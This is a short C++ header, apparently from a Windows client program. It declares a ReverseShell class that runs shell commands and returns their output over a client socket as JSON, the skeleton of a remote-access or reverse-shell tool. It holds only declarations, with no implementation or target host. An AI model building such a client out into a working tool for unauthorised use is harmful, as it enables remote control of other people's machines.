#ifndef CLIENT_REVERSESHELL_H
#define CLIENT_REVERSESHELL_H
#include <fcntl.h>
#include <string>
#include <array>
#include <memory>
#include <iostream>
#include <cstring>
#include "Sender.h"
#include "json.hpp"
#include <windows.h>
#include "ClientSocket.h"
#include "Handler.h"



class ReverseShell : public Handler {
private:
    std::string currentDirectory=".";
public:
    void executeCommandAndSendResult(nlohmann::json jsonObject);
    explicit ReverseShell(ClientSocket &clientSocket);
    std::string executeCommand(const std::wstring&);
    static int runCmd(const std::string &commandToExecute, std::string& outOutput);
};


#endif
